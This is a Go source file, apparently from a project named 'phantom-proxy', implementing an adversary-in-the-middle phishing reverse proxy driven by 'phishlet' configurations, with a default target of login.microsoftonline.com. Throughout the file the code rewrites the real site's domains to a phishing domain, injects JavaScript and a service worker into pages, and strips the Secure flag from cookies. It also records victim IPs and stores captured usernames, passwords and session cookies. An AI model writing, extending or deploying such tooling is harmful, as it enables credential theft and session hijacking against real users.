package proxy

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"go.uber.org/zap"

	"github.com/phantom-proxy/phantom-proxy/internal/config"
	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"github.com/phantom-proxy/phantom-proxy/internal/serviceworker"
	"github.com/phantom-proxy/phantom-proxy/internal/websocket"
)

// HTTPProxy основной HTTP/HTTPS прокси
type HTTPProxy struct {
	mu           sync.RWMutex
	cfg          *config.Config
	db           *database.Database
	logger       *zap.Logger
	server       *http.Server
	tlsConfig    *tls.Config
	wsProxy      *websocket.Proxy
	swInjector   *serviceworker.Injector
	sessions     map[string]*ProxySession
	sessionIndex map[string]string
	phishlets    map[string]*Phishlet
	reverseProxy *httputil.ReverseProxy
}

// ProxySession представляет прокси-сессию
type ProxySession struct {
	ID           string
	VictimIP     string
	TargetHost   string
	TargetURL    *url.URL
	CreatedAt    time.Time
	LastActive   time.Time
	PhishletID   string
	Credentials  *database.Credentials
	Cookies      []*http.Cookie
	RequestCount int64
}

// Phishlet конфигурация для целевого сервиса
type Phishlet struct {
	ID           string
	Author       string
	MinVer       string
	ProxyHosts   []ProxyHost
	SubFilters   []SubFilter
	AuthTokens   []AuthToken
	Credentials  CredConfig
	AuthURLs     []string
	Login        LoginConfig
	JSInjections []JSInjection
}

type ProxyHost struct {
	PhishSub  string
	OrigSub   string
	Domain    string
	Session   bool
	IsLanding bool
}

type SubFilter struct {
	TriggersOn string
	OrigSub    string
	Domain     string
	Search     string
	Replace    string
	Mimes      []string
	regex      *regexp.Regexp
}

type AuthToken struct {
	Domain string
	Keys   []string
}

type CredConfig struct {
	Username FieldConfig
	Password FieldConfig
	Custom   []FieldConfig
}

type FieldConfig struct {
	Key    string
	Search string
	Type   string
	regex  *regexp.Regexp
}

type LoginConfig struct {
	Domain string
	Path   string
}

type JSInjection struct {
	TriggerDomains []string
	TriggerPaths   []string
	TriggerParams  []string
	Script         string
}

// NewHTTPProxy создаёт новый HTTP прокси
func NewHTTPProxy(cfg *config.Config, db *database.Database, logger *zap.Logger) (*HTTPProxy, error) {
	// Загрузка TLS сертификатов
	tlsConfig, err := loadTLSConfig(cfg.CertPath, cfg.KeyPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load TLS config: %w", err)
	}

	p := &HTTPProxy{
		cfg:          cfg,
		db:           db,
		logger:       logger,
		tlsConfig:    tlsConfig,
		sessions:     make(map[string]*ProxySession),
		sessionIndex: make(map[string]string),
		phishlets:    make(map[string]*Phishlet),
		wsProxy:      websocket.NewProxy(logger),
		swInjector:   serviceworker.NewInjector(fmt.Sprintf("https://%s", cfg.Domain), "redirect"),
	}

	// Загрузка phishlets
	if err := p.loadPhishlets(); err != nil {
		logger.Warn("Failed to load phishlets", zap.Error(err))
	}

	// Создание reverse proxy
	p.reverseProxy = &httputil.ReverseProxy{
		Director:       p.director,
		ModifyResponse: p.modifyResponse,
		ErrorHandler:   p.errorHandler,
		Transport:      p.createTransport(),
	}

	// HTTP сервер
	p.server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", cfg.BindIP, cfg.HTTPSPort),
		Handler:      p,
		TLSConfig:    tlsConfig,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	return p, nil
}

// loadTLSConfig загружает TLS сертификаты
func loadTLSConfig(certFile, keyFile string) (*tls.Config, error) {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return nil, err
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		NextProtos:   []string{"h2", "http/1.1"},
	}, nil
}

// ServeHTTP главный обработчик HTTP запросов
func (p *HTTPProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	start := time.Now()

	// Обработка Service Worker
	if strings.HasPrefix(r.URL.Path, "/sw.js") || strings.HasPrefix(r.URL.Path, "/phantom.js") {
		p.swInjector.HandleSWRequest(w, r)
		return
	}

	// Получение или создание сессии
	session := p.getOrCreateSession(r)

	// Логирование запроса
	p.logger.Debug("Incoming request",
		zap.String("session_id", session.ID),
		zap.String("method", r.Method),
		zap.String("url", r.URL.String()),
		zap.String("host", r.Host),
		zap.String("ip", p.getClientIP(r)),
	)

	// Обновление активности
	session.LastActive = time.Now()
	session.RequestCount++

	// Проверка на WebSocket
	if strings.ToLower(r.Header.Get("Upgrade")) == "websocket" {
		p.wsProxy.HandleWS(w, r)
		return
	}

	// Обработка через reverse proxy
	p.reverseProxy.ServeHTTP(w, r)

	// Логирование времени обработки
	p.logger.Debug("Request processed",
		zap.String("session_id", session.ID),
		zap.Duration("duration", time.Since(start)),
	)
}

// director модифицирует запрос перед отправкой на бэкенд
func (p *HTTPProxy) director(req *http.Request) {
	session := p.getSessionFromContext(req)
	if session == nil {
		return
	}

	// Замена Host header
	req.Host = session.TargetHost

	// Замена URL
	if session.TargetURL != nil {
		req.URL.Scheme = session.TargetURL.Scheme
		req.URL.Host = session.TargetURL.Host
	}

	// Замена Referer
	if referer := req.Referer(); referer != "" {
		req.Header.Set("Referer", p.replaceDomain(referer, session))
	}

	// Замена Origin
	if origin := req.Header.Get("Origin"); origin != "" {
		req.Header.Set("Origin", p.replaceDomain(origin, session))
	}

	// Добавление cookies сессии
	for _, cookie := range session.Cookies {
		req.AddCookie(cookie)
	}

	p.logger.Debug("Request modified",
		zap.String("session_id", session.ID),
		zap.String("host", req.Host),
		zap.String("url", req.URL.String()),
	)
}

// modifyResponse модифицирует ответ от бэкенда
func (p *HTTPProxy) modifyResponse(resp *http.Response) error {
	session := p.getSessionFromContext(resp.Request)
	if session == nil {
		return nil
	}

	contentType := resp.Header.Get("Content-Type")

	// Чтение тела ответа
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	resp.Body.Close()

	// Модификация контента
	modifiedBody := body

	// Замена доменов в HTML/JS/JSON
	if p.shouldModifyContent(contentType) {
		modifiedBody = p.applySubFilters(body, session)

		// Инъекция JavaScript в HTML
		if strings.Contains(contentType, "text/html") {
			modifiedBody = p.injectJavaScript(modifiedBody, session)

			// Инъекция Service Worker
			if p.cfg.ServiceWorkerEnabled {
				modifiedBody = p.swInjector.InjectHTML(modifiedBody)
			}
		}
	}

	// Обновление Content-Length
	resp.ContentLength = int64(len(modifiedBody))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(modifiedBody)))

	// Обновление тела ответа
	resp.Body = io.NopCloser(bytes.NewReader(modifiedBody))

	// Замена Set-Cookie доменов
	for _, cookie := range resp.Cookies() {
		cookie.Domain = p.getPhishDomain(cookie.Domain, session)
		cookie.Secure = false
		resp.Header.Add("Set-Cookie", cookie.String())
	}

	p.logger.Debug("Response modified",
		zap.String("session_id", session.ID),
		zap.Int("body_size", len(modifiedBody)),
	)

	return nil
}

// applySubFilters применяет правила замены контента
func (p *HTTPProxy) applySubFilters(body []byte, session *ProxySession) []byte {
	result := body

	if session.PhishletID != "" {
		if phishlet, ok := p.phishlets[session.PhishletID]; ok {
			for _, filter := range phishlet.SubFilters {
				if filter.regex != nil {
					result = filter.regex.ReplaceAll(result, []byte(filter.Replace))
				}
			}
		}
	}

	// Автоматическая замена доменов
	result = bytes.ReplaceAll(result, []byte(session.TargetHost), []byte(session.ID+".phantom.local"))

	return result
}

// injectJavaScript внедряет JavaScript в HTML
func (p *HTTPProxy) injectJavaScript(body []byte, session *ProxySession) []byte {
	bodyTag := []byte("</body>")
	idx := bytes.LastIndex(body, bodyTag)

	if idx == -1 {
		return body
	}

	script := p.generateScript(session)

	result := make([]byte, len(body)+len(script))
	copy(result, body[:idx])
	copy(result[idx:], script)
	copy(result[idx+len(script):], bodyTag)

	return result
}

// generateScript генерирует JavaScript для инъекции
func (p *HTTPProxy) generateScript(session *ProxySession) string {
	script := `<script id="phantom-inject">`

	if session.PhishletID != "" {
		if phishlet, ok := p.phishlets[session.PhishletID]; ok {
			for _, inj := range phishlet.JSInjections {
				script += inj.Script
			}
		}
	}

	script += `</script>`
	return script
}

// shouldModifyContent проверяет, нужно ли модифицировать контент
func (p *HTTPProxy) shouldModifyContent(contentType string) bool {
	modifyTypes := []string{
		"text/html",
		"application/javascript",
		"application/json",
		"text/javascript",
		"text/css",
	}

	for _, t := range modifyTypes {
		if strings.Contains(contentType, t) {
			return true
		}
	}

	return false
}

// replaceDomain заменяет домен в URL
func (p *HTTPProxy) replaceDomain(urlStr string, session *ProxySession) string {
	return strings.ReplaceAll(urlStr, session.TargetHost, session.ID+".phantom.local")
}

// getPhishDomain возвращает фишинговый домен
func (p *HTTPProxy) getPhishDomain(original string, session *ProxySession) string {
	return session.ID + ".phantom.local"
}

// createTransport создаёт HTTP транспорт
func (p *HTTPProxy) createTransport() *http.Transport {
	return &http.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			config := &tls.Config{
				ServerName: getServerName(addr),
				MinVersion: tls.VersionTLS12,
			}
			return tls.Dial(network, addr, config)
		},
		Proxy:                 http.ProxyFromEnvironment,
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
}

func getServerName(addr string) string {
	host, _, _ := net.SplitHostPort(addr)
	return host
}

// getOrCreateSession получает или создаёт сессию
func (p *HTTPProxy) getOrCreateSession(r *http.Request) *ProxySession {
	clientIP := p.getClientIP(r)

	p.mu.RLock()
	if sessionID, ok := p.sessionIndex[clientIP]; ok {
		session := p.sessions[sessionID]
		p.mu.RUnlock()
		return session
	}
	p.mu.RUnlock()

	p.mu.Lock()
	defer p.mu.Unlock()

	if sessionID, ok := p.sessionIndex[clientIP]; ok {
		return p.sessions[sessionID]
	}

	session := p.createSession(clientIP, r)
	p.sessions[session.ID] = session
	p.sessionIndex[clientIP] = session.ID

	return session
}

// createSession создаёт новую сессию
func (p *HTTPProxy) createSession(clientIP string, r *http.Request) *ProxySession {
	id := uuid.New().String()

	targetHost := p.determineTargetHost(r)

	_, err := p.db.CreateSession(
		clientIP,
		targetHost,
		r.UserAgent(),
		"",
	)
	if err != nil {
		p.logger.Error("Failed to create session in DB", zap.Error(err))
	}

	session := &ProxySession{
		ID:         id,
		VictimIP:   clientIP,
		TargetHost: targetHost,
		CreatedAt:  time.Now(),
		LastActive: time.Now(),
		Cookies:    make([]*http.Cookie, 0),
	}

	p.logger.Info("New session created",
		zap.String("session_id", id),
		zap.String("ip", clientIP),
		zap.String("target", targetHost),
	)

	return session
}

// getSessionFromContext извлекает сессию из контекста запроса
func (p *HTTPProxy) getSessionFromContext(r *http.Request) *ProxySession {
	clientIP := p.getClientIP(r)

	p.mu.RLock()
	defer p.mu.RUnlock()

	if sessionID, ok := p.sessionIndex[clientIP]; ok {
		return p.sessions[sessionID]
	}

	return nil
}

// determineTargetHost определяет целевой хост
func (p *HTTPProxy) determineTargetHost(r *http.Request) string {
	if len(p.phishlets) > 0 {
		for _, phishlet := range p.phishlets {
			if len(phishlet.ProxyHosts) > 0 {
				host := phishlet.ProxyHosts[0].OrigSub + "." + phishlet.ProxyHosts[0].Domain
				return host
			}
		}
	}
	return "login.microsoftonline.com"
}

// getClientIP извлекает IP клиента
func (p *HTTPProxy) getClientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}

	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}

	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
	return ip
}

// errorHandler обработчик ошибок прокси
func (p *HTTPProxy) errorHandler(w http.ResponseWriter, r *http.Request, err error) {
	p.logger.Error("Proxy error",
		zap.String("url", r.URL.String()),
		zap.Error(err),
	)

	http.Error(w, "Proxy error: "+err.Error(), http.StatusBadGateway)
}

// Start запускает HTTP сервер
func (p *HTTPProxy) Start(ctx context.Context) error {
	go func() {
		<-ctx.Done()
		p.server.Shutdown(context.Background())
	}()

	p.logger.Info("Starting HTTP/HTTPS proxy",
		zap.String("bind", p.cfg.BindIP),
		zap.Int("port", p.cfg.HTTPSPort))

	if err := p.server.ListenAndServeTLS("", ""); err != http.ErrServerClosed {
		return err
	}

	return nil
}

// GetSession получает сессию по ID
func (p *HTTPProxy) GetSession(id string) (*ProxySession, error) {
	p.mu.RLock()
	defer p.mu.RUnlock()

	session, ok := p.sessions[id]
	if !ok {
		return nil, fmt.Errorf("session not found: %s", id)
	}

	return session, nil
}

// ListSessions возвращает список всех сессий
func (p *HTTPProxy) ListSessions() []*ProxySession {
	p.mu.RLock()
	defer p.mu.RUnlock()

	sessions := make([]*ProxySession, 0, len(p.sessions))
	for _, s := range p.sessions {
		sessions = append(sessions, s)
	}

	return sessions
}

// SaveCredentials сохраняет учётные данные
func (p *HTTPProxy) SaveCredentials(sessionID, username, password string) error {
	session := p.sessions[sessionID]
	if session == nil {
		return fmt.Errorf("session not found")
	}

	creds, err := p.db.SaveCredentials(sessionID, username, password, nil)
	if err != nil {
		return err
	}

	session.Credentials = creds

	p.logger.Info("Credentials captured",
		zap.String("session_id", sessionID),
		zap.String("username", username),
	)

	return nil
}

// AddCookie добавляет cookie в сессию
func (p *HTTPProxy) AddCookie(sessionID, name, value, domain, path string, expires time.Time, httpOnly, secure bool) error {
	session := p.sessions[sessionID]
	if session == nil {
		return fmt.Errorf("session not found")
	}

	if err := p.db.SaveCookie(sessionID, name, value, domain, path, expires, httpOnly, secure); err != nil {
		return err
	}

	session.Cookies = append(session.Cookies, &http.Cookie{
		Name:     name,
		Value:    value,
		Domain:   domain,
		Path:     path,
		Expires:  expires,
		HttpOnly: httpOnly,
		Secure:   secure,
	})

	return nil
}

// GetStats возвращает статистику прокси
func (p *HTTPProxy) GetStats() map[string]interface{} {
	p.mu.RLock()
	defer p.mu.RUnlock()

	stats := map[string]interface{}{
		"total_sessions":   len(p.sessions),
		"active_sessions":  0,
		"total_requests":   int64(0),
		"phishlets_loaded": len(p.phishlets),
	}

	now := time.Now()
	activeCount := 0
	totalRequests := int64(0)

	for _, s := range p.sessions {
		if now.Sub(s.LastActive) < 5*time.Minute {
			activeCount++
		}
		totalRequests += s.RequestCount
	}

	stats["active_sessions"] = activeCount
	stats["total_requests"] = totalRequests

	return stats
}

// ValidateTargetURL проверяет доступность целевого URL
func (p *HTTPProxy) ValidateTargetURL(targetURL string) error {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Head(targetURL)
	if err != nil {
		return fmt.Errorf("target URL is unreachable: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("target URL returned error: %d", resp.StatusCode)
	}

	return nil
}
